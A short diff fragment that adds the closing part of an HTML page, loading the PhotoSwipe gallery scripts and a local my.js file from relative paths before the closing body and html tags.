+    <script type="text/javascript" src="/lib/photoswipe/photoswipe.min.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe-ui-default.min.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/my.js"></script>
+
+
+</body>
+</html>
